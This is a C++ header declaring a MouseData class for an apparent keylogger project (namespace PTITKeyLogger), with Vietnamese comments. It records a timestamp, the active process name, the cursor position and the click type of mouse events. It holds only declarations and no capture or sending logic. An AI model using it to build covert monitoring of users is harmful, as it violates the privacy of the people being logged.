#ifndef MOUSEDATA_HPP_
#define MOUSEDATA_HPP_

#include "IData.hpp"
#include "Protocol.hpp"
#include <unordered_map>

using namespace std;

class MouseData : public IData{
public:
    MouseData();
    MouseData(const vector<char> &data);

    virtual ~MouseData() = default;

private:
    int _timestamp; // Lưu trữ thời gian
    char _procName[256]; //Một mảng lưu trữ các tiến trình
    pair<int, int> _pos; //Cặp tạo độ của vị trí chuột
    PTITKeyLogger::ClickType _clickType; // Lưu trữ loại click chuột

public:
    virtual void dump() const;
    virtual string getData() const;
    virtual shared_ptr<IData> cloneObj(const vector<char> &data);
    virtual void feedObj(const vector<char> &data);

private:
    MouseData(const MouseData &cp) = delete;
    MouseData &operator=(const vector<char> &data);
};

#endif /* MOUSEDATA_HPP_ */